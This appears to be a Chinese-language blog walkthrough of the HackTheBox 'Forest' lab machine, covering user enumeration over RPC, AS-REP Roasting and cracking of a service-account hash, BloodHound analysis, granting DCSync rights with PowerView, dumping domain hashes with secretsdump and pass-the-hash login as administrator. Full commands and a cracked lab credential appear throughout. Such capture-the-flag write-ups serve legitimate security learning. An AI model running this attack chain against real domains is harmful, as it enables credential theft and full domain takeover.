---
title: "HTB Forest"
description: "HackTheBox篇Active Directory 101系列之Forest"

date: 2024-06-27T20:12:35+08:00
lastmod: 2025-11-11T09:30:53+08:00

math: true
mermaid: true

categories:
  - HackTheBox
tags:
  - Windows
  - AS-REP Roasting
  - DCSync
---
<!--more-->

> 靶机ip：10.10.10.161

# 知识点

- AD域渗透提取
- AS-REP Roasting攻击
- Hash爆破
- PTH传递攻击
- 滥用DCSync

# 信息收集

## nmap扫描

拿namp扫一下 

`nmap -sS -sV -sC 10.10.10.161`

![image-20240702183019354](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702183037029-68856069.png)

发现存在系统`Windows Server 2016`，有`DNS`服务，`Kerberos`服务，`smb`共享服务，`RPC`服务，无web页面，只有AD域

先将域名加到配置文件中

```sh
echo "10.10.10.161  htb.local" >> /etc/hosts
echo "10.10.10.161  forest.htb.local" >> /etc/hosts
```

> Domain: htb.local
>
> workgroup: HTB

## SMB

尝试匿名登录SMB服务

`smbclient -L \\10.10.10.161`

![image-20240702183114049](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702183130828-1497766679.png)

也是没有什么重要信息

## LDAP

尝试使用ldapsearch工具尝试获取域中的用户列表，根据之前得到的域名`htb.local`构造如下命令：

`ldapsearch -H ldap://10.10.10.161:389 -x -b "CN=users,DC=htb,DC=local"`

![image-20240702192626662](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702192629104-1904357355.png)

也没什么重要的信息

## RPC

利用RPC远程过程调用枚举用户

```sh
┌──(root㉿DESKTOP-K196DPF)-[~/MyFile]
└─# rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
```

![image-20240702193457026](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702193458453-2004846275.png)

先将用户名整理出来

```txt
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

#  AS-REP Roasting

拿到了用户名，这里又暴露了`kerberos`端口88。尝试一下`AS-REP Roasting`攻击。

将上面的用户名保存为`user.txt`文件，使用`GetNPUsers.py`尝试向`kerberos`请求不需要预认证的票据

`python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.loacl/ -usersfile user.txt  -dc-ip 10.10.10.161`

![image-20240702195558839](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702195600622-2128859699.png)

拿到了一个`svc-alfresco`用户的不需要预认证的票据`hash`

```hash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ebdb0e07d33fac124f8f2366a628920c$fbfa4eaefaece3b6ac1f461570a97940f59e4551f620e061054800b9ce7ae9f86f5b711ef4579b3f9ff2706ab69ad3077ad1e4c81d246d7e83a029dff3837b8452ab50cab25aa6b528dce9584fbb87a37cb3589d09baf8a5e0e4f7e500a53c95772701bc45bca89bfacb2602c9192a121f70346f9436869c60b66573c8f0fbf05a36319686fec69cb54a04e311558fcc6790501776b4b1288ee55489e57131aeb4d944ed3769ccf5a26ff4e4cd418657afc6bd827d874faccde4c4dbbd194eba15ef470c69b39099751446310f18d5f800bc8d38c1f8a2b28064fecc963757f6e583d2afdd87
```

使用`john`进行破解

将上述票据保存为`hash`，使用`john`爆破`hash`值

`john hash --wordlist=/usr/share/wordlists/rockyou.txt`

`john hash -show`

![image-20240702201407967](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702201408699-1289370632.png)

拿到一个凭证：`svc-alfresco : s3rvice`

使用`evil-winrm`远程连接

`evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'`

![image-20240702202205425](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240702202206726-73303224.png)

![image-20240704113809977](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704113818861-542849522.png)

最后在桌面上拿到`user.txt`

# AD域渗透权限提升

## BloodHound信息搜集

`windows`权限提升有一款工具叫做`BloodHound`

这里使用的是kali的`BloodHound`工具

```sh
# 先启动 neo4j
neo4j start # 访问网址默认用户名和密码都是neo4j，登入后修改密码即可
# 再启动 BloodHound
bloodhound
# 输入用户名和修改后的密码即可登录
```

`SharpHound.exe`下载链接：https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

将`SharpHound.exe`上传到目标机器并运行，即可得到一个zip文件，该文件里面就是信息搜集的结果，将它下载到本地

```sh
upload /root/htb/Machines/forest/SharpHound.exe
./SharpHound.exe
download 20240703005056_BloodHound.zip
```

![image-20240703154557962](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703154602854-406882194.png)

![image-20240703154608670](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703154612998-402889656.png)

登录到Bloodhound，点击右边上传按钮，将解压后的`json`文件提交上传

我们查找一下我们已有用户`svc-alfresco`相关信息

![image-20240703155410634](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703155415163-444323121.png)

## 信息分析

点击左侧`Unrolled Group Membership`可以发现与其相关的用户组和用户

![image-20240703163420335](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703163424801-1273724818.png)

重点看下半部分

![image-20240703163322390](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703163326843-375757956.png)

可以发现`svc-alfresco`用户属于`Account Operators`组，该组是AD域中的特权组之一，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器。 但是，不能更改属于`Administrators`或`Domain Admins`组的账号，也不能更改这些组。

![image-20240703170202999](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240703170207796-1894446677.png)

点击`Find Shortest Paths to Domain Admins`可以看到上图结果

其中，从`svc-alfresco`到`Domain Admins `的路径中发现，`EXCHANGE WINDOWS PERMISSIONS`组与`Account Operators` 组有`GenericAll`关系，表示`EXCHANGE WINDOWS PERMISSIONS`组完全信任`Account Operators` 组，而上面还提到`svc-alfresco`用户属于`Account Operators`组，且`Account Operators`组的成员可以创建和管理该域中的用户和组并为其设置权限，因此我们可以利用`Account Operators`组的权限创建一个新用户，将其添加到`EXCHANGE WINDOWS PERMISSIONS`组，同时可以看到`EXCHANGE WINDOWS PERMISSIONS`组的成员对`HTB.LOCAL`有`WriteDacl`权限，可以用新添加的用户对`HTB.LOCAL`的`WriteDacl`权限进行恶意利用，从而实现提权

## 创建一个恶意用户

回到`Evil-WinRM`，先利用`ACCOUNT OPERATION`的权限去创建一个新的用户

```sh
net user popayw 123abc! /add /domain	# 创建用户
net group "Exchange Windows Permissions" popayw /add	# 将用户添加到Exchange Windows Permissions组
```

![image-20240705131611080](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240705131624984-738117392.png)

用户创建完毕，再利用`WriteDacl`权限去给我们用户所在组加权限，这里使用`PowerSploit`中的`powerview.ps1`来滥用`WriteDacl`权限，通过`upload`将`powerview.ps1`文件传进去

运行命令导入脚本

```sh
. .\PowerView.ps1
```

这时候就会发现运行`menu`模块增加

* 运行之前

![image-20240704140302757](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704140311010-817859956.png)

* 运行之后

![image-20240704140320314](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704140329286-337456579.png)

再定义两个变量，用于创建凭证对象并授予 `DCSync` 权限，其中`Add-DomainObjectAcl`模块可以添加`DCSync`权限

```sh
$pass = convertto-securestring '123abc!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('HTB\popayw', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity popayw -Rights DCSync
```

![image-20240704142412881](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704142421132-450044665.png)

## DCSync攻击导出域内哈希

* DCSync攻击原理

> **主要利用的是域控制器之间的数据同步复制**
>
> 当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。
> 如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。

用户想要发起`DCSync`攻击，必须获得以下任一用户的权限

- Administrators组内的用户
- Domain Admins组内的用户
- Enterprise Admins组内的用户
- 域控制器的计算机帐户

之前我们已经创建了一个有`DCSync`权限的用户，我们可以使用`secretsdump.py`工具执行 `DCSync` 以转储管理员用户的 `NTLM` 哈希

`python3 /usr/share/doc/python3-impacket/examples/secretsdump.py popayw:'123abc!'@10.10.10.161`

![image-20240704150539216](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704150548072-705369653.png)

可以看到已经拿到所有用户的`hash`，包括`admin`用户的

## PTH传递攻击获取Root

拿到了管理员的`hash`，就可以通过`wmiexec`哈希传递拿到管理员用户的权限

`python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 htb.local/administrator@10.10.10.161`

![image-20240704151145045](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704151153151-1244754650.png)

成功拿到管理员用户的权限

![image-20240704151417342](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20240704151425592-732615984.png)

最后也是在`desktop`获取`root.txt`

